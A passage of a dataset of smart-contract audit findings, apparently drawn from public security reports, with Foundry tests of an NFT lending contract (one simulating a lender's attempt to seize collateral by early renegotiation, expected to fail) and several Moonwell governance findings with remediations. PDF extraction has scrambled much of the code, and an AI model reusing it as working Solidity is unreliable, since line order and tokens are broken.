BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , signaturefi ,  borrowerSettings ); 656 657 658 // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 loanPrincipalAmount , uint256 maximumRepaymentAmount ,  uint256 nftCollateralId , address loanERC20Denomination , uint32  loanDuration , uint32 loanInterestRateForDuration , uint16  loanAdminFeeInBasisPoints , address nftCollateralWrapper , uint64  loanStartTime , address nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 659 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 660 661 // LOGS 41 G N I T S E T L A U N A M 662 663 664 665 666 console . log (\" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log (\" \"); console . log (\" ****** STATE 1 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 667 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 668 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 669 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 670 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 671 672 673 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount ---> \" ,  loanPrincipalAmount ); 674 console . log (\" maximumRepaymentAmount ---> \" ,  maximumRepaymentAmount ); 675 console . log (\" nftCollateralId ---> \" ,  nftCollateralId ); 676 console . log (\" loanERC20Denomination ---> \" ,  loanERC20Denomination ); 677 678 console . log (\" loanDuration console . log (\" interestRateForDuration ---> \" , loanDuration ); ---> \" ,  loanInterestRateForDuration ); 679 console . log (\" loanAdminFeeInBasisPoints ---> \" ,  loanAdminFeeInBasisPoints ); 680 console . log (\" nftCollateralWrapper ---> \" ,  nftCollateralWrapper ); 681  ; 682 console . log (\" loanStartTime ---> \" , loanStartTime ) console . log (\" nftCollateralContract ---> \" ,  nftCollateralContract ); 683 684 685 686 687 688 689 690 691 console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" , borrower ); ---> \" , liquidated ); // 3 DAYS LATER vm . warp (3 * day ); console . log (\" 3 DAYS LATER ... \"); // BOBBY LIQUIDATES THE LOAN 42 G N I T S E T L A U N A M 692 693 694 695 696 697 698 vm . prank ( bobby ); vm . expectRevert () ; directLoanFixedOfferRedeploy . liquidateOverdueLoan (1) ; // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 a , uint256 b , uint256 c , address d , uint32 e , uint32  f , uint16 g , address h , uint64 i , address j , address k ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 699 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 700 701 702 703 704 console . log (\" TX : BOBBY ---> LIQUIDATE LOAN \"); console . log (\" \"); console . log (\" ****** STATE 3 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 705 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 706 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 707 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 708 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount console . log (\" maximumRepaymentAmount console . log (\" nftCollateralId console . log (\" loanERC20Denomination console . log (\" loanDuration console . log (\" interestRateForDuration console . log (\" loanAdminFeeInBasisPoints console . log (\" nftCollateralWrapper console . log (\" loanStartTime console . log (\" nftCollateralContract console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); 709 710 711 712 713 714 715 716 717 718 719 720 721 722 723 724 } 725 726 function firstStep_test5 () internal { 727 ---> \" ,a ); ---> \" ,b ); ---> \" ,c ); ---> \" ,d ); ---> \" ,e ); ---> \" ,f ); ---> \" ,g ); ---> \" ,h ); ---> \" ,i ); ---> \" ,j ); ---> \" ,k ); ---> \" , liquidated ); 43 G N I T S E T L A U N A M 728 729 730 731 732 733 734 735 736 737 738 739 740 741 742 // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 1, nftCollateralContract : address ( nftContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo }) ; // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 743 744 745 746 747 748 749 750 751 752 753 754 755 756 757 758 759 760 // GETTING CHAIN ID uint256 id ; assembly { id := chainid () } // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : hex \" 1c \" }) ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( getEncodedOffer ( offer ) ,  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) ); // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) 761 762 763 764 765 766 767  ; 44 G N I T S E T L A U N A M 768 769 770 771 772 773 774 775 776 777 778 779 780 781 782 783 bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf }) ; // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , signaturefi ,  borrowerSettings ); 784 785 786 // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 loanPrincipalAmount , uint256 maximumRepaymentAmount ,  uint256 nftCollateralId , address loanERC20Denomination , uint32  loanDuration , uint32 loanInterestRateForDuration , uint16  loanAdminFeeInBasisPoints , address nftCollateralWrapper , uint64  loanStartTime , address nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 787 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 788 789 790 791 792 793 794 // LOGS console . log (\" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log (\" \"); console . log (\" ****** STATE 1 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 795 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 796 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 797 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 798 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 799 console . log (\" \"); 45 G N I T S E T L A U N A M 800 801 console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount ---> \" ,  loanPrincipalAmount ); 802 console . log (\" maximumRepaymentAmount ---> \" ,  maximumRepaymentAmount ); 803 console . log (\" nftCollateralId ---> \" ,  nftCollateralId ); 804 console . log (\" loanERC20Denomination ---> \" ,  loanERC20Denomination ); 805 806 console . log (\" loanDuration console . log (\" interestRateForDuration ---> \" , loanDuration ); ---> \" ,  loanInterestRateForDuration ); 807 console . log (\" loanAdminFeeInBasisPoints ---> \" ,  loanAdminFeeInBasisPoints ); 808 console . log (\" nftCollateralWrapper ---> \" ,  nftCollateralWrapper ); 809  ; 810 console . log (\" loanStartTime ---> \" , loanStartTime ) console . log (\" nftCollateralContract ---> \" ,  nftCollateralContract ); 811 812 813 814 } console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" , borrower ); ---> \" , liquidated ); G N I T S E T L A U N A M 46 Output G N I T S E T L A U N A M 47 /* ******************************************************* */ /* TEST 5: BORROWING + WANT TO PAY LATE + RENEGOTIATE LOAN */ /* ******************************************************* */ console . log (\" ****************************** \" ); ********** \" ); console . log (\" ********** console . log (\" ****************************** \" ); console . log (\" \"); TEST 5 // 15 DAYS LATER console . log (\" 12 DAYS LATER ... \" ); vm . warp (12 days ); TEST 5: Script Listing 9: NFTFi.t.sol id2 := chainid () firstStep_test5 () ; uint256 id2 ; assembly { 816 function test_5 () public { 817 818 819 820 821 822 823 824 825 826 827 828 829 830 831 832 833 834 835 836 837 838 839 840 841 842 843 844 845 846 847 848 849 850 851 852 853 854 855 ); } ) uint256 _expiry = block . timestamp + 20 days ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( uint256 (1) , uint32 (30 days ) , uint256 (20 _000000000000000000 ) , uint256 (5 _000000000000000000 ) , abi . encodePacked ( bobby , uint256 (2) , _expiry ) , address ( directLoanFixedOfferRedeploy ) , id2 // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE 48 G N I T S E T L A U N A M 856 ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage )  ; 857 858 859 860 861 862 863 bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory _lenderSignature = bytes . concat (r , s , v_bytes ); // ALICE WANTS TO RENEGOTIATE vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 5  _000000000000000000 ); 864 865 vm . prank ( alice ); directLoanFixedOfferRedeploy . renegotiateLoan (1 , 30 days , 20  _000000000000000000 , 5 _000000000000000000 , 2, _expiry ,  _lenderSignature ); 866 867 868 869 870 871 872 873 // 10 DAYS LATER console . log (\" 10 DAYS LATER ... \" ); vm . warp (10 * day ); // ALICE PAY THE MONEY vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 20  _000000000000000000 ); 874 875 vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 20  _000000000000000000 ); 876 877 878 879 880 vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 a , uint256 b , uint256 c , address d , uint32 e , uint32  f , uint16 g , address h , uint64 i , address j , address k ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 881 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 882 883 884 885 886 console . log (\" TX : ALICE ---> PAY BACK LOAN \" ); console . log (\" \"); console . log (\" ****** STATE 3 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 887 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 49 G N I T S E T L A U N A M 888 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 889 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 890 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 891 892 893 894 895 896 897 898 899 900 901 902 903 904 905 906 } console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount console . log (\" maximumRepaymentAmount console . log (\" nftCollateralId console . log (\" loanERC20Denomination console . log (\" loanDuration console . log (\" interestRateForDuration console . log (\" loanAdminFeeInBasisPoints console . log (\" nftCollateralWrapper console . log (\" loanStartTime console . log (\" nftCollateralContract console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" ,a ); ---> \" ,b ); ---> \" ,c ); ---> \" ,d ); ---> \" ,e ); ---> \" ,f ); ---> \" ,g ); ---> \" ,h ); ---> \" ,i ); ---> \" ,j ); ---> \" ,k ); ---> \" , liquidated ); G N I T S E T L A U N A M 50 Output G N I T S E T L A U N A M 51 TEST 6: Script Listing 10: NFTFi.t.sol 908 function test_6 () public { 909 /*  ******************************************************************  */ 910 /* TEST 6: ATTACK LENDER WANTS TO STEAL NFT BY RENEGOTIATE  LOAN EARLY */ /* 911  ******************************************************************  */ 912 913 914 915 916 917 918 919 920 921 922 923 924 925 926 927 928 929 930 931 932 933 934 935 936 937 938 939 940 941 942 console . log (\" ****************************** \" ); console . log (\" ********** ********** \" ); console . log (\" ****************************** \" ); console . log (\" \"); TEST 6 firstStep_test5 () ; // 1 DAY LATER console . log (\" 1 DAYS LATER ... \"); vm . warp (1 days ); // MSG HASH PREPARATION uint256 id2 ; assembly { id2 := chainid () } uint256 _expiry = block . timestamp + 10; // + 10 seconds // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( uint256 (1) , uint32 (0) , uint256 (1 _000000000000000000 ) , uint256 (0) , abi . encodePacked ( bobby , uint256 (2) , _expiry ) , address ( directLoanFixedOfferRedeploy ) , id2 ) ); 52 G N I T S E T L A U N A M 943 944 945 946 947 948  ; 949 950 951 952 953 954 955 956 // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory _lenderSignature = bytes . concat (r , s , v_bytes ); // ALICE WANTS TO RENEGOTIATE vm . prank ( bobby ); vm . expectRevert () ; directLoanFixedOfferRedeploy . renegotiateLoan (1 , 0, 1  _000000000000000000 , 0, 2, _expiry , _lenderSignature ); 957 958 959 960 961 962 963 964 // BOBBY TRIES TO LIQUIDATE THE LOAN vm . prank ( bobby ); vm . expectRevert () ; directLoanFixedOfferRedeploy . liquidateOverdueLoan (1) ; // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 a , uint256 b , uint256 c , address d , uint32 e , uint32  f , uint16 g , address h , uint64 i , address j , address k ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 965 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 966 967 968 969 970 console . log (\" TX : ALICE ---> PAY BACK LOAN \" ); console . log (\" \"); console . log (\" ****** STATE 3 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 971 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 972 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 973 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 974 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 975 976 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); 53 G N I T S E T L A U N A M 977 978 979 980 981 982 983 984 985 986 987 988 989 990 } console . log (\" loanPrincipalAmount console . log (\" maximumRepaymentAmount console . log (\" nftCollateralId console . log (\" loanERC20Denomination console . log (\" loanDuration console . log (\" interestRateForDuration console . log (\" loanAdminFeeInBasisPoints console . log (\" nftCollateralWrapper console . log (\" loanStartTime console . log (\" nftCollateralContract console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" ,a ); ---> \" ,b ); ---> \" ,c ); ---> \" ,d ); ---> \" ,e ); ---> \" ,f ); ---> \" ,g ); ---> \" ,h ); ---> \" ,i ); ---> \" ,j ); ---> \" ,k ); ---> \" , liquidated ); G N I T S E T L A U N A M 54 Output G N I T S E T L A U N A M 55 ",
        "labels": [
            "Halborn",
            "NFTfi_DirectLoanFixedOffer_Redeployment",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING QUORUM CAP COMPARISON CAN BREAK THE GOVERNANCE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "GovernorApollo is implemented with a new floating quorum feature. A floating quorum is calculated as a weighted average between 80% of the old quorum and 20% of the most recent vote(s). The quorum also has upper and lower bounds. In these bounds, there is no comparison implemented. With the following scenario, dynamic quorum system can be broken. SCENARIO:  Set quorum caps with the timelock.  There is no comparison between lowerQuorumCap and upperQuorumCap.  With the timelock, lowerQuorumCap can be bigger than upperQuorumCap.  During _calculateNewQuorum calculation, newQuorum can be directly manipulated with the timelock. Code Location: MoonwellApolloGovernor.sol#L523 Listing 1: MoonwellApolloGovernor.sol function setQuorumCaps ( uint newLowerQuorumCap , uint require ( msg . sender == address ( timelock ) , \" only timelock \"); 1  newUpperQuorumCap ) external { 2 3 4 5 6 7  newLowerQuorumCap ); } 8 9 if ( newLowerQuorumCap != lowerQuorumCap ) { uint oldLowerQuorumCap = lowerQuorumCap ; lowerQuorumCap = newLowerQuorumCap ; emit LowerQuorumCapChanged ( oldLowerQuorumCap , 13 if ( newUpperQuorumCap != upperQuorumCap ) { uint oldUpperQuorumCap = upperQuorumCap ; upperQuorumCap = newUpperQuorumCap ; emit UpperQuorumCapChanged ( oldUpperQuorumCap , 10 11 12 13  newUpperQuorumCap ); 14 } 15 } Risk Level: Likelihood - 4 Impact - 4 Recommendation: Ensure that lowerQuorumCap is not bigger than upperQuorumCap. Remediation Plan: SOLVED: The Moonwell team solved this issue by implementing the comparison between caps. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 14 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: High"
        ]
    },
    {
        "title": "ABIENCODERV2 IS ACTIVATED BY DEFAULT 0.8+",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "ABIEncoderV2 is being stated in a solidity version 0.8+ which is not needed since ABIEncoderV2 is activated by default 0.8+. Code Location: MoonwellApolloGovernor.sol#L2 Listing 2: MoonwellApolloGovernor.sol 1 pragma solidity 0.8.10; 2 pragma experimental ABIEncoderV2 ; 3 4 import \" ./ IERC20 . sol \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider removing the ABIEncoderV2. Remediation Plan: SOLVED: The Moonwell team solved this issue by removing ABIEncoderV2. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 15 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "BUMP SOLIDITY VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the review the newest version of solidity was released with the important bug fixes & Bug. Code Location: MoonwellApolloGovernor.sol#L2 Listing 3: MoonwellApolloGovernor.sol 1 pragma solidity 0.8.10; 2 pragma experimental ABIEncoderV2 ; 3 4 import \" ./ IERC20 . sol \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Move from 0.8.10 to 0.8.17. Remediation Plan: SOLVED: The Moonwell team solved this issue by updating pragma to 0.8.17. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 16 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO NEED TO INITIALIZE QUORUMADJUSTED WITH FALSE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "boolean variable are initialized to a default value of false per Solidity docs. Setting a variable to the default value is unnecessary. Code Location: MoonwellApolloGovernor.sol#L278 Listing 4: MoonwellApolloGovernor.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Proposal storage newProposal = proposals [ proposalCount ]; newProposal . id = proposalCount ; newProposal . proposer = msg . sender ; newProposal . eta = 0; newProposal . targets = targets ; newProposal . values = values ; newProposal . signatures = signatures ; newProposal . calldatas = calldatas ; newProposal . startTimestamp = startTimestamp ; newProposal . endTimestamp = endTimestamp ; newProposal . startBlock = 0; newProposal . forVotes = 0; newProposal . againstVotes = 0; newProposal . abstainVotes = 0; newProposal . totalVotes = 0; newProposal . canceled = false ; newProposal . executed = false ; newProposal . quorum = currentQuorum ; newProposal . quorumAdjusted = false ; 17 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Remove explicit initialization for default values. Remediation Plan: SOLVED: The Moonwell team solved this issue by removing explicit ini- tialization. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 18 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "CURRENT QUORUM CAN BE EMITTED DURING THE PROPOSAL CREATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Events allow capturing the changed parameters so that off-chain tool- s/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages. In the implementation, current quorum is not emitted on the proposal generation. Code Location: MoonwellApolloGovernor.sol#L282 Listing 5: MoonwellApolloGovernor.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Proposal storage newProposal = proposals [ proposalCount ]; newProposal . id = proposalCount ; newProposal . proposer = msg . sender ; newProposal . eta = 0; newProposal . targets = targets ; newProposal . values = values ; newProposal . signatures = signatures ; newProposal . calldatas = calldatas ; newProposal . startTimestamp = startTimestamp ; newProposal . endTimestamp = endTimestamp ; newProposal . startBlock = 0; newProposal . forVotes = 0; newProposal . againstVotes = 0; newProposal . abstainVotes = 0; newProposal . totalVotes = 0; newProposal . canceled = false ; newProposal . executed = false ; 19 latestProposalIds [ newProposal . proposer ] = proposalCount ; newProposal . quorum = currentQuorum ; newProposal . quorumAdjusted = false ; 18 19 20 21 22 23  values , signatures , calldatas , startTimestamp , endTimestamp ,  description ); 24 return newProposal . id ; emit ProposalCreated ( newProposal .id , msg . sender , targets , Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider omitting current quorum on the proposal creation. Remediation Plan: SOLVED: The Moonwell team solved this issue by adding current quorum to the event. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 20 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE PREFIX INCREMENT WITH THE UNCHECK CAN SAVE GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The code sections use i++ which costs more gas than ++i, especially in a loop. Finally, the initialization of i = 0 can be skipped, as 0 is the default value. Code Location: MoonwellApolloGovernor.sol#L255-L676 Listing 6: MoonwellApolloGovernor.sol function getQuorum () public view returns ( uint ) { // Start at the high water mark for ( uint i = lastQuorumAdjustment + 1; i < proposalCount ; // Pull state and ignore in flight proposals ProposalState proposalState = state ( i ); if ( proposalState == ProposalState . Pending || uint newQuorum = currentQuorum ; 1 2 3 4 5  i ++) { 6 7 8  proposalState == ProposalState . Active ) { 9 10 11 12 13 14 15  taken into account . 16 17  calculations . 18 19 continue ; continue ; } // Get the proposal Proposal storage proposal = proposals [i ]; // Only proceed if quorum for this proposal is not yet if (! proposal . quorumAdjusted ) { // If a proposal is canceled , ignore it in quorum if ( proposalState == ProposalState . Canceled ) { 21 // Adjust quorum in accordance with the proposal . newQuorum = _calculateNewQuorum ( newQuorum , } 20 21 22 23  proposal . totalVotes ); 24 25 26 27 28 29 } } } return newQuorum ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use ++i instead of i++ to increment the value of an uint variable. Use unchecked where possible, and skip initialization to 0. Remediation Plan: SOLVED: The Moonwell team solved this issue with using prefix increment. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 22 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "SAFEMATH IS ACTIVATED BY DEFAULT AFTER 0.8.X",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Solidity versions >= 0.8.x perform checked arithmetic by default, so the SafeMath library is unnecessary in most cases. Code Location: MoonwellApolloGovernor.sol#L704-L713 Listing 7: MoonwellApolloGovernor.sol function add256 ( uint256 a , uint256 b ) internal pure returns ( uint c = a + b ; require (c >= a , \" addition overflow \" ); return c; function sub256 ( uint256 a , uint256 b ) internal pure returns ( require (b <= a , \" subtraction underflow \"); return a - b ; } 1  uint ) { 2 3 4 5 6 7  uint ) { 8 9 10 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to delete SafeMath from the contract. 23 Remediation Plan: SOLVED: The Moonwell team solved this issue with deleting SafeMath from the contract. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 24 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING NATSPEC DOCUMENTATION ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Some functions are missing @param for some of their parameters. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability, and usability. Code Location: MoonwellApolloGovernor.sol#L523 Listing 8: MoonwellApolloGovernor.sol function setQuorumCaps ( uint newLowerQuorumCap , uint require ( msg . sender == address ( timelock ) , \" only timelock \"); 1  newUpperQuorumCap ) external { 2 3 4 5 6 7  newLowerQuorumCap ); 8 } 9 10 11 12 13  newUpperQuorumCap ); 14 } 15 } if ( newLowerQuorumCap != lowerQuorumCap ) { uint oldLowerQuorumCap = lowerQuorumCap ; lowerQuorumCap = newLowerQuorumCap ; emit LowerQuorumCapChanged ( oldLowerQuorumCap , if ( newUpperQuorumCap != upperQuorumCap ) { uint oldUpperQuorumCap = upperQuorumCap ; upperQuorumCap = newUpperQuorumCap ; emit UpperQuorumCapChanged ( oldUpperQuorumCap , 25 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider adding in full NatSpec comments for all functions to have complete code documentation for future use. Remediation Plan: SOLVED: The Moonwell team solved this issue by adding natspecs on the functions. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 26 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "CHANGING FUNCTION VISIBILITY FROM PUBLIC TO EXTERNAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_Dynamic_Quorum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are the functions declared as public that are never called internally It is good practice to mark such functions as within the contract. external, as this saves gas (Especially in the case where the function takes arguments, since external functions can read arguments directly from call data instead of having to allocate memory). Code Location: Listing 9: MoonwellApolloGovernor.sol } bytes32 domainSeparator = keccak256 ( abi . encode ( function castVoteBySig ( uint256 proposalId , uint8 voteValue , function castVote ( uint proposalId , uint8 voteValue ) public { return _castVote ( msg . sender , proposalId , voteValue ); 1 2 3 4 5  uint8 v , bytes32 r , bytes32 s ) public { 6  DOMAIN_TYPEHASH , keccak256 ( bytes ( name )) , getChainId () , address (  this ))); 7  proposalId , voteValue )) ; 8  domainSeparator , structHash )) ; 9 10  castVoteBySig : invalid signature \"); 11 12 address signatory = ecrecover ( digest , v , r , s ); require ( signatory != address (0) , \" GovernorApollo :: bytes32 digest = keccak256 ( abi . encodePacked (\" \\ x19 \\ x01 \" , return _castVote ( signatory , proposalId , voteValue ); bytes32 structHash = keccak256 ( abi . encode ( BALLOT_TYPEHASH , } 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Functions should be marked as an external for gas optimization. Listing 10 1 public - everyone can access . 2 3 external - Cannot be accessed internally , only externally . 4 5 internal - only this contract and contracts derived from it can  access . 6 7 private - can only be accessed from this contract . Remediation Plan: SOLVED: The Moonwell team solved this issue by setting external functions. Commit ID: c7da88a3fe3f0062d8a83ba808b648f1da369fec 28 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_Dynamic_Quorum",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF DENOM VALIDATION ON CHECKED ASSET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Mars_CW_Asset_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
